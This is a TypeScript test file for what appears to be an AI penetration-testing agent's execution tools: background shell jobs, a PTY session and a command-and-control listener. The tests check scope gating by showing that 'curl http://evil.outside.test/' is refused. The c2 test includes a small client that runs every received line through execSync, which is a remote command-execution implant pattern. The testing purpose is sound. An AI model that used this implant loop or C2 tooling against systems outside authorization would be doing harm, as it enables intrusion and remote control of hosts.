import assert from "node:assert/strict";
import { connect, type Socket } from "node:net";
import { execSync } from "node:child_process";
import { mkdirSync, mkdtempSync, rmSync } from "node:fs";
import { tmpdir } from "node:os";
import { join } from "node:path";
import { test } from "node:test";
import { openHistory } from "@gongyuai/history";
import type { WorkerManifest } from "@gongyuai/contracts";
import { c2Tool, shellJob, shellSession } from "./exec-tools.js";
import { closeExecRuntime } from "./exec-runtime.js";
import type { ToolContext } from "./tools.js";

function fixture(t: { after: (fn: () => void) => void }, targets: string[] = ["127.0.0.1", "10.10.0.0/16"]) {
  const root = mkdtempSync(join(tmpdir(), "gy-exectools-"));
  const evidenceDir = join(root, "evidence");
  const workspaceDir = join(root, "workspace");
  mkdirSync(evidenceDir, { recursive: true });
  mkdirSync(workspaceDir, { recursive: true });
  const manifest: WorkerManifest = {
    taskId: "22222222-2222-4222-8222-222222222222",
    dataDir: root,
    historyDb: join(root, "history.sqlite"),
    durableDb: join(root, "durable.sqlite"),
    evidenceDir,
    workspaceDir,
    auth: { authorizationNote: "local fixture authorization note", targets, outOfScope: [], capability: "active-lab" },
    scopeVersion: 1,
    goals: [],
    budget: { maxTokens: 10_000, maxWallMs: 60_000, maxToolCalls: 100, maxInstalls: 2, relayTokenThreshold: 30_000, relayMinToolCalls: 2 },
    execution: { maxConcurrentExplores: 1, maxIntentsPerReason: 4, maxIntentsPerAssetRoot: 2, exploreTimeoutMs: 900_000, reasonLeaseMs: 120_000 },
    workerId: "t0",
    workerSlot: 0,
    workerCount: 1,
    commandConfirmation: "auto",
    mock: false,
    mcpServers: [], mcpPool: [], mcpCatalog: [], skillPacks: [], skillPool: [], skillCatalog: [], assetCollectors: [],
  };
  const history = openHistory({ dbPath: join(root, "history.sqlite"), evidenceDir });
  const ctx: ToolContext = { manifest, history, usage: { toolCalls: 0, installs: 0 } };
  t.after(() => {
    closeExecRuntime();
    history.close();
    rmSync(root, { recursive: true, force: true });
  });
  return { ctx, root, evidenceDir };
}

test("shell_job 启动/等待/读取：作业活过工具调用", async (t) => {
  const { ctx } = fixture(t);
  const started = JSON.parse(await shellJob(ctx, { action: "start", command: "printf 'job-ok\\n'; sleep 0.2", label: "t" })) as { ok: boolean; job: { id: string } };
  assert.equal(started.ok, true);
  const waited = JSON.parse(await shellJob(ctx, { action: "wait", jobId: started.job.id, waitMs: 10_000 })) as { status: string; stdout: string; exitCode: number };
  assert.equal(waited.status, "exited");
  assert.equal(waited.exitCode, 0);
  assert.match(waited.stdout, /job-ok/);
  const polled = JSON.parse(await shellJob(ctx, { action: "poll", jobId: started.job.id, offset: 0 })) as { status: string; stdout: string };
  assert.equal(polled.status, "exited");
  assert.match(polled.stdout, /job-ok/);
});

test("shell_job 越界命令在 gate 处被拒", async (t) => {
  const { ctx } = fixture(t);
  await assert.rejects(() => shellJob(ctx, { action: "start", command: "curl http://evil.outside.test/" }), /not in auth\.targets|越界/);
});

test("shell_session：PTY 打开、写入、读到输出、关闭", async (t) => {
  const { ctx } = fixture(t);
  const opened = JSON.parse(await shellSession(ctx, { action: "open" })) as { ok: boolean; session: { id: string } };
  assert.equal(opened.ok, true);
  const wrote = JSON.parse(await shellSession(ctx, { action: "write", sessionId: opened.session.id, data: "echo session-ok" })) as { ok: boolean };
  assert.equal(wrote.ok, true);
  const waited = JSON.parse(await shellSession(ctx, { action: "wait", sessionId: opened.session.id, pattern: "session-ok", waitMs: 10_000 })) as { matched: boolean };
  assert.equal(waited.matched, true);
  const closed = JSON.parse(await shellSession(ctx, { action: "close", sessionId: opened.session.id })) as { ok: boolean };
  assert.equal(closed.ok, true);
});

test("c2：监听、会话、范围内任务、越界任务拒绝", async (t) => {
  const { ctx } = fixture(t);
  const listened = JSON.parse(await c2Tool(ctx, { action: "listen", bindHost: "127.0.0.1", bindPort: 0 })) as { ok: boolean; listener: { id: string; bindPort: number } };
  assert.equal(listened.ok, true);
  const ref: { socket: Socket | null } = { socket: null };
  t.after(() => ref.socket?.destroy());
  await new Promise<void>((resolve, reject) => {
    ref.socket = connect({ host: "127.0.0.1", port: listened.listener.bindPort }, resolve);
    ref.socket.on("error", reject);
    ref.socket.write("ready\n");
    ref.socket.on("data", (chunk: Buffer) => {
      for (const line of chunk.toString("utf8").split("\n")) {
        if (!line.trim()) continue;
        try {
          ref.socket!.write(execSync(line, { encoding: "utf8", timeout: 5_000 }));
        } catch {
          ref.socket!.write("ERR\n");
        }
      }
    });
  });
  await new Promise((r) => setTimeout(r, 400));
  const sessions = JSON.parse(await c2Tool(ctx, { action: "sessions" })) as { sessions: Array<{ id: string; allowed: boolean }> };
  assert.equal(sessions.sessions.length, 1);
  assert.equal(sessions.sessions[0]!.allowed, true);
  const task = JSON.parse(await c2Tool(ctx, { action: "task", sessionId: sessions.sessions[0]!.id, command: "printf c2-ok", waitMs: 8_000 })) as { ok: boolean; task: { result: string } };
  assert.equal(task.ok, true);
  assert.match(task.task.result, /c2-ok/);
  const blocked = JSON.parse(await c2Tool(ctx, { action: "task", sessionId: sessions.sessions[0]!.id, command: "curl http://evil.outside.test/", waitMs: 2_000 })) as { ok: boolean; error: string };
  assert.equal(blocked.ok, false);
  assert.match(blocked.error, /越界|not in auth/);
  const closed = JSON.parse(await c2Tool(ctx, { action: "close-listener", listenerId: listened.listener.id })) as { ok: boolean };
  assert.equal(closed.ok, true);
});
